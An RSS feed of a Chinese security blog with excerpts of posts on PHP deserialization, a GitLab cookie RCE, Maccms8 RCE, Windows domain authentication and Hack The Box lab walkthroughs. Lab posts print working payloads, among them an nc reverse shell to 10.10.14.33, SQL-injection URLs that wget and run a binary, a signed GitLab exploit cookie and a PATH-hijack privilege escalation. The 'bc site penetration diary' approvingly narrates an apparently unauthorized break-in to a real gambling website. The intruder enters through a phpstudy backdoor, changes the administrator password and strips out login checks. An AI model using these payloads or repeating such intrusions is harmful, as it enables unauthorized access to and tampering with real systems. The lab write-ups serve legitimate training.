<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on F0rmat的博客 | 专注于网络攻防和信息安全</title>
    <link>https://getshe11.com/post/</link>
    <description>Recent content in Posts on F0rmat的博客 | 专注于网络攻防和信息安全</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <lastBuildDate>Tue, 01 Jun 2021 13:20:00 +0000</lastBuildDate><atom:link href="https://getshe11.com/post/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>PHP反序列化研究</title>
      <link>https://getshe11.com/post/research-on-php-deserialization/</link>
      <pubDate>Tue, 01 Jun 2021 13:20:00 +0000</pubDate>
      
      <guid>https://getshe11.com/post/research-on-php-deserialization/</guid>
      <description>什么是序列化与反序列化 序列化的概念 将对象或者数组转化为可存储的字符串。
在PHP中使用serialize()函数来将对象或者数组进行序列化，并返回一个包含字节流的字符串来表示。
我们使用类的序列化比较多，所以这里就用一个序列化对象的例子来演示：
&amp;lt;?php #创建一个类 class test{ public $a = &amp;#39;sdfsdfa&amp;#39;; protected $b = 1111; private $c = false; public function displayVar() { echo $this-&amp;gt;a; } } $d = new test(); //实例化对象 $d = serialize($d);//序列化对象 var_dump($d);//输出序列化后的结果 ?&amp;gt;运行的结果：
string(73) &amp;#34;O:4:&amp;#34;test&amp;#34;:3:{s:1:&amp;#34;a&amp;#34;;s:7:&amp;#34;sdfsdfa&amp;#34;;s:4:&amp;#34;\000*\000b&amp;#34;;i:1111;s:7:&amp;#34;\000test\000c&amp;#34;;b:0;}&amp;#34; 我们从头开始分析各个部分的数组代表着什么：
O:4:&amp;ldquo;test&amp;rdquo;:3 O代表是对象类型，如果是a那就是数组类型;4是对象名称的长度，test是对象名称，3代表是有3个成员。
s:1:&amp;ldquo;a&amp;rdquo;;s:7:&amp;ldquo;sdfsdfa&amp;rdquo; 第一个s代表变量名称是字符串类型，a是变量名称；第二个s代表变量值是字符串类型，7是变量值得长度，后面是变量的值。
s:4:&amp;quot;\000\000b&amp;quot;;i:1111* 这里的字符串不应该是1吗？为什么是4呢，而且还多了一些字符。我们看到成员变量b的属性是protected；
protected属性序列化的时候格式是 %00%00成员名 ；*
一个%00代表一个字节，所以protected有两个%00，再加上*和变量名称长度一共是4个字节；
接下来的i代表变量数值是整数型。
s:7:&amp;quot;\000test\000c&amp;quot;;b:0 这里也出现了%00字符而且还多了类的名称，为什么呢？我们看到成员变量c的属性是private；
private属性序列化的时候格式是 %00类名%00成员名；
这里也是有两个%002个字节加上类名的4个字节和变量名一个字节，加起来就是7个字节；
下面的b代表着变量值是布尔型。
大家在这里有发现对象序列化后为什么方法没有跟着一起序列化呢？
因为serialize()函数只对类的属性序列化，不序列化方法。
反序列化的概念 将序列化后的字符串转换回对象或者数组。
在PHP中使用unserialize()函数来将序列化后的字符串转换回PHP的值，并返回的值可为 integer、float、string、array 或 object类型。
我们重新用上面的例子并把序列化的结果写入一个文本中存储：
&amp;lt;?php class test{ public $a = &amp;#39;sdfsdfa&amp;#39;; protected $b = 1111; private $c = false; public function displayVar() { echo $this-&amp;gt;a; } } $d = new test(); $d = serialize($d); file_put_contents(&amp;#39;1.</description>
    </item>
    
    <item>
      <title>Gitlab Cookie 反序列化漏洞研究</title>
      <link>https://getshe11.com/post/research-on-gitlab-cookie-deserialization-vulnerability/</link>
      <pubDate>Thu, 01 Apr 2021 13:20:00 +0000</pubDate>
      
      <guid>https://getshe11.com/post/research-on-gitlab-cookie-deserialization-vulnerability/</guid>
      <description>0x00 前言 前天上hackthebox玩了一台靶机Laboratory，发现是利用gitlab任意文件读取漏洞进行getshell的，我看了挺多相关的walkthrough，都没有说最后getshell的原理，都是直接上msf就完事了。怎么一个任意文件读取漏洞都能直接getshell，看着一知半解不是很舒服，遂研究。 0x01 寻找源头 1、Hackone 起初是William Bowling (vakzz)在Hackone提交了这个漏洞下面是漏洞详细的链接：https://hackerone.com/reports/827052这个页面一开始是讲到了这个任意文件读取的缺陷，UploadsRewriter 函数没有验证文件名导致的任意文件读取，gitlab评估了这个漏洞值1000美元。事情发生了转变，作者在后面补上了这个https://gitlab.com/gitlab-org/gitlab-foss/-/blob/master/config/initializers/cookies_serializer.rb#L4说 cookies_serializer 设置了默认值 :hybrid 可能会导致远程命令执行漏洞
 利用上面的任意文件读取漏洞读取/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml里面的secret_key_base值 利用secret_key_base值生成payload 将payload封装在cookie的 experimentation_subject_id  发送完成攻击  作者给了一段生成payload的代码：
request = ActionDispatch::Request.new(Rails.application.env_config) request.env[&amp;#34;action_dispatch.cookies_serializer&amp;#34;] = :marshal cookies = request.cookie_jar erb = ERB.new(&amp;#34;&amp;lt;%= `echo vakzz was here &amp;gt; /tmp/vakzz` %&amp;gt;&amp;#34;) depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &amp;#34;@result&amp;#34;, ActiveSupport::Deprecation.new) cookies.signed[:cookie] = depr puts cookies[:cookie] 一开始我看到这个有点懵，但是我不熟悉Ruby啊。那就照葫芦画瓢在kali输入irb输入上面的代码，一顿操作猛如虎，一看错误二百五~有点头疼，那且先放一边，再往下看。作者执行后，发送get数据包，成功执行了命令：
curl -vvv &amp;#39;http://gitlab-vm.local/users/sign_in&amp;#39; -b &amp;#34;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBlY2hvIHZha3p6IHdhcyBoZXJlID4gL3RtcC92YWt6emAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpUOglAdmFySSIMQHJlc3VsdAY7ClQ=--ef9c244a1f6b4724c1d3cbf045f8ee28a42d4b06&amp;#34; 后面gitlab重新定级给了作者20000美金！后来我再细读我才知道，作者这个是在装有gitlab的rails console 上面执行的，下面是执行的结果：2、作者的PDF 还是看不懂，怎么就getshell了啊，继续搜索。看到作者写的一个关于这个漏洞的PDF文件：https://devcraft.io/assets/hacktivitycon-slides.pdf里面在RCE那一块给了一个链接：https://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/读英文还是有点吃力哈，文章说的是如何使用secret_token来入侵rails的应用一个session cookie例子：
_MyApp_session=BAh7B0kiD3Nlc3Npb25faWQGOgZFRkkiJTcyZTAwMmRjZTg2NTBiZmI0M2UwZmY0MjEyNGJjODBhBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMWhmYTBKSGQwYVQxRlhnTFZWK2FEZEVhbEtLbDBMSitoVEo5YU4zR2dxM3M9BjsARg%3D%3D--dc40a55cd52fe32bb3b84ae0608956dfb5824689 原文：
 The cookie value (the part after the =) is split into 2 parts, separated by --.</description>
    </item>
    
    <item>
      <title>Kali Linux安装Clash</title>
      <link>https://getshe11.com/post/kali-install-clash/</link>
      <pubDate>Sat, 06 Mar 2021 13:20:00 +0000</pubDate>
      
      <guid>https://getshe11.com/post/kali-install-clash/</guid>
      <description>下载Clash https://github.com/Dreamacro/clash/releases
下载
clash-linux-amd64-v1.4.1.gz
安装Clash 解压gz包
gzip -d clash-linux-amd64-v1.4.1.gz
给执行权限
chmod +x ./clash-linux-amd64-v1.4.1
运行Clash
./clash-linux-amd64-v1.4.1
配置Clash 运行后会在下面的目录有两个文件
/home/kali/.config/clash
下面这两个配置文件可以去Windows那边配置好的拖过来就行了 config.yml 一般在下面这个目录
C:\Users\用户.config\clash\profiles
Country.mmdb 一般在下面这个目录
C:\Users\用户.config\clash
你从profiles目录下可能是数字的yml，把它改成config.yml 就行了
然后把config.yml 和Country.mmdb放在kali的/home/kali/.config/clash目录下
运行Clash ./clash-linux-amd64-v1.4.1
然后打开http://yacd.haishan.me/
设置代理或者全局就行了 </description>
    </item>
    
    <item>
      <title>关于Kali2020安装Parallels Tools后Chrome显示空白</title>
      <link>https://getshe11.com/post/pd-chrome-3d/</link>
      <pubDate>Wed, 30 Dec 2020 13:20:00 +0000</pubDate>
      
      <guid>https://getshe11.com/post/pd-chrome-3d/</guid>
      <description>0x00 起因 kali安装好了pdtools，突然发现chrome和edge浏览器打开都是空白
0x01 解决 逛pd的论坛发现是3D加速的问题，要么关闭3D加速：
但是用pd就是奔着3D加速的，vmware也是开启了3d加速，但是跟没开一样，还是pd香。
于是就有了下面的解决办法：
google-chrome --use-gl=swiftshader microsoft-edge --use-gl=swiftshader 或者：
google-chrome --disable-gpu microsoft-edge --disable-gpu 0x02 参考 https://forum.parallels.com/threads/google-chrome-black-screen-on-ubuntu-18-04.347169/</description>
    </item>
    
    <item>
      <title>Kali Linux 2020.4安装Parallels Tools</title>
      <link>https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/</link>
      <pubDate>Wed, 30 Dec 2020 00:20:00 +0000</pubDate>
      
      <guid>https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/</guid>
      <description>0x00 前言 最近在vmware fusion里面用kali实在是太卡了，就想着换到pd会不会快一点呢？
于是就开始立马动手！
装完后，wow！很顺畅，但是屏幕分辨率和复制粘贴等操作不方便，就要开始装pd tools了，以前也是因为这个问题就放弃了在pd里面操作kali。
开始安装pd tools。。。
中间装了无数次。。。
弄到晚上3点多还没搞定，睡觉了。。。
早上起来精神不错，看了老外给的解决方法，终于搞定了！
0x01 解决问题 1、环境  macOS Big Sur 11.2 Parallels Desktop 16.0.1 Kali Linux 2020.4 (linux-headers-5.9.0-kali5-common)  2、解决过程 先把系统更新到最新：
apt-get update apt-get upgrade -y apt-get dist-upgrade -y 挂载parallels tools并移动到桌面：
cp -R /media/cdrom0/ ~/Desktop/pdtools/ 安装
./install 这个时候就开始出错了，因为之前报错的log我没保存下来。。下面是解决的办法
解压kmods里面的压缩包,并删除之前的压缩包（如果想要原文件直接去/media/cdrom0里面拖出来）：
tar -xzf prl_mod.tar.gz rm prl_mod.tar.gz 修改prl_fs/SharedFolders/Guest/Linux/prl_fs/inode.c，在最上面加上下面这行：
#define segment_eq(a, b) ((a).seg == (b).seg) 修改prl_fs_freeze/Snapshot/Guest/Linux/prl_freeze/prl_fs_freeze.c，在最上面加上下面这行：
#include &amp;lt;linux/blkdev.h&amp;gt;然后重新打包：
tar -zcvf prl_mod.tar.gz . dkms.conf Makefile.kmods 最后**./install** 成功！</description>
    </item>
    
    <item>
      <title>Hackthebox-Pathfinder</title>
      <link>https://getshe11.com/post/pathfinder/</link>
      <pubDate>Sat, 19 Dec 2020 00:20:00 +0000</pubDate>
      
      <guid>https://getshe11.com/post/pathfinder/</guid>
      <description>0x00 前言 前面的所有密码：
  Archetype：
Mssql:M3g4c0rp123
Administrator:MEGACORP_4dm1n!!
  Oopsie
Mysql:M3g3C0rpUs3r!
ftp:mc@F1l3ZilL4
  Vaccine
Zip:741852963
Web:qwerty789
postgres:P@s5w0rd!
  Shield
domain：Sandra：Password1234!
  0x01 过程 1、信息收集 nmap收集信息：
可以看到开放了88（kerberos）、389（ldap）、3268（全局编录端口），可以判断着一台可能是域控（Domain controller）。
既然在上一台靶机获得了域用户的账号密码，那就用来登陆这一台主机看看，首先用的是Psexec工具，在kali上面Impacket工具已经包含了这个脚本Psexec.py
语法是：
psexec.py [[domain/] username [: password] @] [Target IP Address]
很奇怪，登陆了居然是system，那下面就不用打下去了～
应该是共享靶机的问题吧，那先按正常流程走一遍，之前我也用这种方式登陆过，但是也出现了认证的错误。
遇到域我已经大半年没有搞过技术了，有点生疏，顺便复习了一遍，写了一篇笔记： https://getshe11.com/2020/12/16/Domain-security/
我看了walkthrough里面一开始就使用bloodhound去枚举域信息，收集域信息，看下有哪些账户是存在配置缺陷之类的，想了解一下bloodhound是什么可以看官方文档： https://bloodhound.readthedocs.io/en/latest/index.html
安装地址： https://github.com/fox-it/BloodHound.py
为什么要用python版本的bloodhound？因为我们直接用psexec是登陆不上去的，而且也没有开3389端口，也就你无法放exe和ps1的脚本放上去执行
GitHub主页也没什么使用方法，直接命令-h查看参数：
usage: bloodhound-python [-h] [-c COLLECTIONMETHOD] [-u USERNAME] [-p PASSWORD] [-k] [--hashes HASHES] [-ns NAMESERVER] [--dns-tcp] [-d DOMAIN] [-dc HOST] [-gc HOST] [-w WORKERS] [-v] [--disable-pooling] Python based ingestor for BloodHound For help or reporting issues, visit https://github.</description>
    </item>
    
    <item>
      <title>Windows认证与域渗透</title>
      <link>https://getshe11.com/post/domain-security/</link>
      <pubDate>Wed, 16 Dec 2020 09:31:30 +0000</pubDate>
      
      <guid>https://getshe11.com/post/domain-security/</guid>
      <description>0x00 Windows系统中的工作组、域、域控、活动目录 1、工作组 工作组是局域网中的一个概念，由许多在同一物理地点，而且被相同的局域网连接起来的用户组成的小组，也可以是遍布一个机构的，但却被同一网络连接的用户构成的逻辑小组。工作组是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，加入工作组是为了区分用户计算机在网络中的类别，如果用户有工作组的话，在管理上会方便很多，可以共享/使用打印机和协和工作，很多小企业都是用这种方法来管理电脑，共享文件。
工作组环境中的登录验证过程：工作组网络也称为“对等式”的网络，因为网络中每台计算机的地位都是平等的，它们的资源以及管理是分散在每台计算机之上，所以工作组环境的特点就是分散管理，工作组环境中的每台计算机都有自己的“本机安全账户数据库”，称为SAM数据库。这个SAM数据库是干什么用的呢？其实就是平时我们登录电脑时，当我们输入账户和密码后，此时就会去这个SAM数据库验证，如果我们输入的账户存在SAM数据库中，同时密码也正确，SAM数据库就会通知系统让我们登录。而这个SAM数据库默认就存储在C:\WINDOWS\system32\config文件夹中。
2、域（Domain） 域英文叫DOMAIN——域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。
域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域，每个域都有自己的安全策略，以及它与其他域的安全信任关系。
可以把域和工作组联系起来理解，在工作组上你一切的设置在本机上进行包括各种策略，用户登录也是登录在本机的，密码是放在本机的数据库来验证的。而如果你的计算机加入域的话，各种策略是域控制器统一设定，用户名和密码也是放到域控制器去验证，也就是说你的账号密码可以在同一域的任何一台计算机登录。登陆到域中的时候，身份验证是采用Kerberos协议在域控制器上进行的，登陆到此计算机则是通过SAM来进行NTLM验证的。
3、域控（域控制器 ，Domain Controller，简写为DC） 在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为“域控制器（Domain Controller，简写为DC）”。 域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，他只能以对等网用户的方式访问Windows共享出来的资源，这样就在一定程度上保护了网络上的资源。
域控是活动目录的存储地方，也就是说活动目录存储在域控制器内。安装了活动目录的计算机就称为域控制器，其实在你第一次安装活动目录的时候，你安装活动目录的那台计算机就成为了域控制器。一个域可以有一台或多台域控制器。最经典的做法是做一个主辅域控。
4、活动目录（Active Directory 简称 AD） 活动目录是微软Windows Server中，负责架构中大型网路环境的集中式目录管理服务（Directory Services）。目录服务在微软平台上从Windows Server 2000开始引入，所以我们可以理解为活动目录是目录服务在微软平台的一种实现方式。当然目录服务在非微软平台上都有相应的实现。
Windows Server 2003的域环境与工作组环境最大的不同是，域内所有的计算机共享一个集中式的目录数据库（又称为活动目录数据库），它包含着整个域内的对象（用户账户、计算机账户、打印机、共享文件等）和安全信息等等，而活动目录负责目录数据库的添加，修改，更新和删除。所以我们要在Windows Server 2003上实现域环境，其实就是要安装活动目录。活动目录为我们实现了目录服务，提供对企业网络环境的集中式管理。比如在域环境中，只需要在活动目录中创建一次Bob账户，那么就可以在任意200台电脑中的一台上登录Bob，如果要为Bob账户更改密码，只需要在活动目录中更改一次就可以了，也就是说域用户信息保存在活动目录中。
5、域、域树、林和组织单元 活动目录的逻辑结构包裹：域（Domain）、域树(Domain Tree)、林（Forest）和组织单元（Organization Unit）。如下图域是一种逻辑分组，准确的说是一种环境，域是安全的最小边界。域环境能对网络中的资源集中统一的管理，要想实现域环境，你必须要计算机中安装活动目录。 域树是由一组具有连续命名空间的域组成的。如下图
其中最上层的域名为contoso.com，这个域是这棵域树的根域(root domain)，此根域下面 有2个子域，分别是gsd.contoso.com和ged.contoso.com。从图中我们可以看出他们的命名空间具有连续性。例如，域gsd.contoso.com的后缀名包含着上一层父域的域名contoso.com。其实子域gsd.contoso.com和ged.contoso.com还都可以有自己的子域，图中我没有给出而已。 域树内的所有域共享一个Active Directory(活动目录)，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据，如该域内的用户账户，计算机账户等，Windows Server 2003将存储在各个域内的对象总称为Active Directory。 林（Forest）是有一棵或多棵域树组成的，每棵域树独享连续的命名空间，不同域树之间没有命名空间的连续性。林中第一棵域树的根域也整个林的根域，同时也是林的名称。 组织单元（OU）是一种容器，它里面可以包含对象（用户账户，计算机账户等），也可以包含其他的组织单元（OU）。
0x01 Windows认证 1、NTLM 简介 在NTLM协议问世之前，它对前身就是LM（LAN Manager）协议，其中NTLM协议全称是：“NT LAN Manager”。
LM与NTLM协议的认证机制相同，但是加密算法不同。
目前大多数的Windows都采用NTLM协议认证，LM协议已经基本淘汰了。
这个NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。
也就是说，NTLM与NTLM Hash相互对应。
认证过程 NTLM验证是一种Challenge/Response 验证机制，由三种消息组成:通常称为type 1(协商)，类型type 2(质询)和type 3(身份验证)。</description>
    </item>
    
    <item>
      <title>Hackthebox-Shield</title>
      <link>https://getshe11.com/post/shield/</link>
      <pubDate>Mon, 07 Dec 2020 22:17:00 +0000</pubDate>
      
      <guid>https://getshe11.com/post/shield/</guid>
      <description>0x01 前言 根据hackthebox的惯性，我在这里收集了前面的所有密码：
  Archetype：
Mssql:M3g4c0rp123
Administrator:MEGACORP_4dm1n!!
  Oopsie
Mysql:M3g3C0rpUs3r!
ftp:mc@F1l3ZilL4
  Vaccine
Zip:741852963
Web:qwerty789
postgres:P@s5w0rd!
  0x02 过程 信息收集 Getshell 看到只有两个端口：80、3306，3306我尝试了连接，发现不给外链，那入口就应该在80端口，打开是一个iis默认的页面
开dirbuster进行目录扫描，发现是一个wordpress程序：
看到是wp中间散发了挺多思路的，首先是使用wpscan进行插件、主题漏洞扫描，之后是枚举用户密码。
后来发现wp的版本是大于5.0的，很多漏洞都不能利用了，尝试密码大法最终使用**P@s5w0rd!**成功登陆了后台：
编辑主题：http://10.10.10.29/wordpress/wp-admin/theme-editor.php?file=search.php&amp;amp;theme=twentysixteen
修改了search.php的内容为我们的冰蝎php马：
一句话地址：http://10.10.10.29/wordpress/wp-content/themes/twentysixteen/search.php
用冰蝎命令执行没有交互式，有交互式的虚拟终端太卡了。还是上msf吧：
msf &amp;gt; use exploit/unix/webapp/wp_admin_shell_upload msf &amp;gt; set PASSWORD P@s5w0rd! msf &amp;gt; set USERNAME admin msf &amp;gt; set TARGETURI /wordpress msf &amp;gt; set RHOSTS 10.10.10.29 msf &amp;gt; run 使用msf的shell还是不好用，毕竟是根据webshell来建立连接的：
还是直接上nc，使用刚才在冰蝎上传的nc.exe:
execute -f nc.exe -a &amp;quot;-e cmd.exe 10.10.14.33 1234&amp;quot;</description>
    </item>
    
    <item>
      <title>Hackthebox-Archetype</title>
      <link>https://getshe11.com/post/archetype/</link>
      <pubDate>Sun, 06 Dec 2020 15:30:00 +0000</pubDate>
      
      <guid>https://getshe11.com/post/archetype/</guid>
      <description>0x01 前言 挺久没接触技术，最近准备考OSCP，就先拿Hack The Box里面的题目先练练手。
这个靶机是Starting Point Lab的机器Archetype，收获还是挺多的，记录一下。
0x02 过程 拿到ip先上nmap：
我刚开始扫的时候还没有3389这个端口，应该是free的共享靶机，大家都可以用的，穷啊～
看到445可以用smb工具来连接查看下有什么共享信息：
尝试了下面的共享只有backups这个disk可以进去，里面还有一个配置文件，直接get下来看看有什么：
看到了mssql的连接信息，应该就是对应nmap扫描出来的1433端口：
但这里出现了一个问题，靶机是共享的，1433端口被搞坏了。。。：
剩下的具体可以看下这篇文章：https://medium.com/@dpgg/hackthebox-archetype-starting-point-391af7b10fea
0x03 总结 1、smbclient命令
smbclient(选项)(参数)
-B&amp;lt;ip地址&amp;gt;：传送广播数据包时所用的IP地址； -d&amp;lt;排错层级&amp;gt;：指定记录文件所记载事件的详细程度； -E：将信息送到标准错误输出设备； -h：显示帮助； -i&amp;lt;范围&amp;gt;：设置NetBIOS名称范围； -I&amp;lt;IP地址&amp;gt;：指定服务器的IP地址； -l&amp;lt;记录文件&amp;gt;：指定记录文件的名称； -L：显示服务器端所分享出来的所有资源； -M&amp;lt;NetBIOS名称&amp;gt;：可利用WinPopup协议，将信息送给选项中所指定的主机； -n&amp;lt;NetBIOS名称&amp;gt;：指定用户端所要使用的NetBIOS名称； -N：不用询问密码； -O&amp;lt;连接槽选项&amp;gt;：设置用户端TCP连接槽的选项； -p&amp;lt;TCP连接端口&amp;gt;：指定服务器端TCP连接端口编号； -R&amp;lt;名称解析顺序&amp;gt;：设置NetBIOS名称解析的顺序； -s&amp;lt;目录&amp;gt;：指定smb.conf所在的目录； -t&amp;lt;服务器字码&amp;gt;：设置用何种字符码来解析服务器端的文件名称； -T&amp;lt;tar选项&amp;gt;：备份服务器端分享的全部文件，并打包成tar格式的文件； -U&amp;lt;用户名称&amp;gt;：指定用户名称； -w&amp;lt;工作群组&amp;gt;：指定工作群组名称。 连接服务器smbclient //192.168.0.1/tmp -U username%password
2、mssql开启xp_cmdshell
EXEC sp_configure &amp;#39;Show Advanced Options&amp;#39;, 1;	\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项 reconfigure;	\\确认上面的操作 sp_configure;	\\查看当前sp_configure配置情况 EXEC sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1	\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令 reconfigure;	\\确认上面的操作 xp_cmdshell &amp;#34;whoami&amp;#34; \\在靶机上调用cmdshell执行whoami 3、使用mssql的xp_cmdshell反弹shell</description>
    </item>
    
    <item>
      <title>Hackthebox-Oopsie</title>
      <link>https://getshe11.com/post/oopsie/</link>
      <pubDate>Sun, 06 Dec 2020 12:53:00 +0000</pubDate>
      
      <guid>https://getshe11.com/post/oopsie/</guid>
      <description>0x01 前言 做完Archetype继续来做Oopsie
0x02 过程 Scan Port： Getshell 开启burp suite浏览网站，发现后台：
使用Archetype实验获取到的密码MEGACORP_4dm1n!! 登陆成功：
上传功能要超级管理员才可以上传，使用Accout页面的功能枚举账号：
使用burpsuite的intruder功能进行爆破：
访问上传页面拦截并修改cookie的user参数：
成功显示上传界面：
编写kali自带的php-reverse-shell.php，文件在/usr/share/webshells/php，把信息修改成监听的机子：
监听端口，等待连接：
上传php文件：
但是找不到上传后的文件地址，使用kali自带的dirbuster对网站进行扫描：
找到uploads文件，尝试把上传的文件名放在uploads访问，已经反弹成功：
Privilege Escalation 读取web应用下的db.php文件获取到数据库连接信息：
登陆robert用户，因为还不是交互式的shell，可以使用命令SHELL=/bin/bash script -q /dev/null :
看到robert用户属于两个组，看下bugtracker有s权限，能使用root的权限执行：
输入id，可以看到它是使用cat读取root目录的文件信息：
我们可以使用改变当前目录的path值，当前用户执行bugtracker程序是会优先使用当前的path变量：
然后在tmp目录下写入一个cat，程序会先执行这个cat，cat的内容是/bin/bash，执行后会以root形式执行 /bin/bash /root/reports/：
执行成功后：
0x03 总结 1、还是要细心为主
2、关于文中为什么可以用bugtracker来提权为root，可以参考以下两个链接：
 关于Linux下s、t、i、a权限：https://www.cnblogs.com/qlqwjy/p/8665871.html
LINUX s权限位提权：http://www.361way.com/suid-privilege/5965.html
 3、过程有一个设置path的知识点
robert@oopsie:/$ export PATH=/tmp:$PATH robert@oopsie:/$ cd /tmp robert@oopsie:/tmp$ echo &amp;#39;/bin/bash&amp;#39; &amp;gt; cat robert@oopsie:/tmp$ chmod +x cat  export PATH=/tmp:$PATH export是设置环境变量，这条语句设置PATH的变量，/tmp:$PATH 的$PATH代表原本的PATH变量，把/tmp加到这边变量的前面
4、提权到root发现cat用不了，因为我们已经改变了cat为/bin/bash,可以使用more、xxd等命令查看文件内容</description>
    </item>
    
    <item>
      <title>Hackthebox-Vaccine</title>
      <link>https://getshe11.com/post/vaccine/</link>
      <pubDate>Sat, 05 Dec 2020 00:44:00 +0000</pubDate>
      
      <guid>https://getshe11.com/post/vaccine/</guid>
      <description>0x01前言 hackthebox练习
0x02 过程 首先直接nmap ：
发现只有三个端口，根据上一台Oopsie靶机最后给的信息
ftpuser / mc@F1l3ZilL4
直接登陆ftp，里面有个备份文件的压缩包：
但是解压需要密码，可以使用zip2john工具，是john包含的一款把zip转换成john能破解的工具：https://github.com/openwall/john
zip2john ~/backup.zip &amp;gt; hash
使用john破解：
John hash
查看解压的index.php文件：
从代码逻辑看得出来只要username等于admin且密码等于密码md5加密过后的值，解密2cb42f8734ea607eefed3b70af13bbd3
使用该密码登陆80端口的web应用：
存在sql注入：
使用sqlmap跑，但是不能执行&amp;ndash;os-shell，官方的可以，可能是网络的问题，进行sql 查询的时候就特别卡
网上介绍https://www.aldeid.com/wiki/HackTheBox-StartingPoint-Vaccine
可以用python脚本vaccine.py
https://github.com/florianges/-HTB-Vaccine_sql_injection
发现执行不成功，可能还是网络问题，还是乖乖放浏览器执行吧
http://10.10.10.46/dashboard.php?search=a&amp;#39;;DROP TABLE IF EXISTS cmd_31554; -- - http://10.10.10.46/dashboard.php?search=a&amp;#39;;CREATE TABLE cmd_31554(cmd_output text); -- - http://10.10.10.46/dashboard.php?search=a&amp;#39;;COPY cmd_31554 FROM PROGRAM &amp;#39;wget -P /tmp/31554 http://10.10.14.33:80/nc&amp;#39;; -- - http://10.10.10.46/dashboard.php?search=a&amp;#39;;COPY cmd_31554 FROM PROGRAM &amp;#39;chmod 777 /tmp/31554/nc&amp;#39;; -- - http://10.10.10.46/dashboard.php?search=a&amp;#39;;COPY cmd_31554 FROM PROGRAM &amp;#39;/tmp/31554/nc 10.10.14.33 4444 -e /bin/bash&amp;#39;; -- - 反弹成功：</description>
    </item>
    
    <item>
      <title>bc站渗透日记</title>
      <link>https://getshe11.com/post/bc-penetration-diary/</link>
      <pubDate>Sat, 13 Jun 2020 00:24:46 +0000</pubDate>
      
      <guid>https://getshe11.com/post/bc-penetration-diary/</guid>
      <description>0x01前言 不废话了，反正就是遇到这个网站了哈哈哈
0x02 过程 看了是do结尾的，以为是struts2，随便输点字符发现是thinkphp的：
直接上RCE，靠，日不动。
扫了下目录，发现没啥内容
没办法了，直接nmap看下，然后ping看看ip
直接打开ip，我去，一看就是phpstudy
phpstudy 后门走起，直接干！
就这样拿到shell咯，特别枯燥～
whoami看下权限,不是administrator的权限
用query user看下管理员在不在线，看到一个隐藏用户admin$(运行中是我登录的)，明显被人日过了
看到admin$是administrator用户组,nice!
不用说啦，直接改密码，我本身这个用户也是administrator用户组的
ipconfig看下网络，双网卡，太幸运了。
也开了3389
直接rdp上3389
翻下phpstudy的域名管理，找到后台登录域名
登录页面，这妹子我喜欢～
看了下他还有一个phpmyadmin，直接root/root进去了
但是密码是特殊加密过的，安全码直接给出明文
密码是加密的又如何，服务器权限都在手上了，干就完了！
直接编辑登录文件，把登录验证部分去掉
随便输入密码登录即可，但是没啥用，一个测试平台
想继续干点内网的事情，看了下vmtools，没啥意思，我这边也没备用外网机子。
0x03 结尾 就到这咯，如果再深入也就是拿多几台虚拟机，略懂安全技术世界的人，就是那么枯燥无味～</description>
    </item>
    
    <item>
      <title>Maccms8最新命令执行漏洞</title>
      <link>https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/</link>
      <pubDate>Sun, 22 Dec 2019 11:17:18 +0000</pubDate>
      
      <guid>https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/</guid>
      <description>0x01 前言 太久太久没写文章。。。最近还发布了一些法律，许多网站都关了，我还在考虑是否去开这个博客，因为分享技术还得承担法律责任，不过不会再公布具有攻击性的工具或者exp。
这个maccms的RCE是最近被绕过了，写一篇分析文。环境搭建的也不多写了，之前写的一篇Maccms的sql注入http://getshe11.com/2018/08/26/Maccms-sql-injection-analysis/ 有讲到 本文用到的源码可以去https://github.com/yaofeifly/Maccms8.x 这里下载 绕过的源码可以去https://github.com/magicblack/maccms8 下载
0x02 漏洞复现   https://github.com/yaofeifly/Maccms8.x 下载搭建好之后
  用hackbar
  url：http://127.0.0.1/maccms888/?m=vod-search
post：wd={if-A:phpinfo()}{endif-A}
